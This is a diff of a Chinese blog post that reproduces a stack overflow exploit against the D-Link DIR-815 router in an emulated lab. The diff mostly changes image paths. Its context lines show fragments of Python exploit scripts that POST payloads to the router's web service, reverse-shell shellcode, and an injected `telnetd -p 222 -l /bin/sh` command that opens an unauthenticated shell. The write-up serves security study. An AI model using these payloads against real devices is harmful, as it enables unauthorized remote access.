 <p>生成的exploit2通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh运行得到shell。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cncvlp31337png" alt=""></p>
+<p><img src="ncvlp31337png" alt=""></p>
 </li>
 </ol>
 <h2 id="利用HTTP报文获取shell"><a href="#利用HTTP报文获取shell" class="headerlink" title="利用HTTP报文获取shell"></a>利用HTTP报文获取shell</h2><p>其实现在mips虚拟机相当于一个开启了部分web服务的DIR815路由器，我们可以通过发送http报文获取shell。</p>
@@ -789,7 +789,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
     <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
 <p>测试结果：获取shell</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Chttpshell.png" alt=""></p>
+<p><img src="httpshell.png" alt=""></p>
 <p>利用sleep调用shellcode(反弹shell)</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -857,9 +857,9 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
     <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
 <p>测试结果：获取shell</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Chttp_getshell_sleep.png" alt=""></p>
+<p><img src="http_getshell_sleep.png" alt=""></p>
 <h2 id="利用Firmadyne仿真进行测试"><a href="#利用Firmadyne仿真进行测试" class="headerlink" title="利用Firmadyne仿真进行测试"></a>利用Firmadyne仿真进行测试</h2><p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cfirmadyne.png" alt=""></p>
+<p><img src="firmadyne.png" alt=""></p>
 <p>nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。</p>
 <pre class=" language-sh"><code class="language-sh">Starting Nmap 7.01 ( https://nmap.org ) at 2020-05-24 16:21 CST
 Nmap scan report for 192.168.0.1
@@ -931,9 +931,9 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
     <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
 <p>测试结果显示能够执行<code>telnetd -p 222 -l /bin/sh</code>。telnet 上去对应的窗口直接反弹shell。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Ctelnetdp222.png" alt=""></p>
+<p><img src="telnetdp222.png" alt=""></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里，终于分析完了，整个过程其实遇到了不少的坑，从最开始死活到不了第二个sprintf，到后面的qemu系统模式如何修改http配置文件都起不来http服务，还有shellcode的修改等等问题都可能卡好久，最后解决的时候才知道并不是太难的问题。。。还是太菜了！我这都是第二次分析了，才能有个大概的了解，想想一年的自己到底学到了什么。。。整个流程完全自己复现一遍并且能够很清楚的讲出来，其实个人感觉收获还是很多的，比如路由器缓冲区溢出漏洞的分析调试详细流程，gdb、IDA、Ghidra等工具联调使用，以及该libc的万能gadget等等。</p>
-<p>真的特别感谢H4lo大佬，我碰到解决不了的问题都会去询问他，他也不厌其烦的回答我并一起解决！他人太好了，希望不断保持学习的状态，追赶上他吧！</p>
+<p>真的特别感谢H4lo大佬，我碰到解决不了的问题会去询问他，他也不厌其烦的回答我并一起解决！希望不断保持学习的状态，追赶上他吧！</p>
 <h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
 <p><a href="https://www.anquanke.com/post/id/187443#h2-9" target="_blank" rel="noopener">IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现</a></p>
 <p><a href="[https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-%E5%8F%8D%E5%BC%B9get-shell](https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell)">Building MIPS Environment for Router &amp;&amp; PWN</a></p>
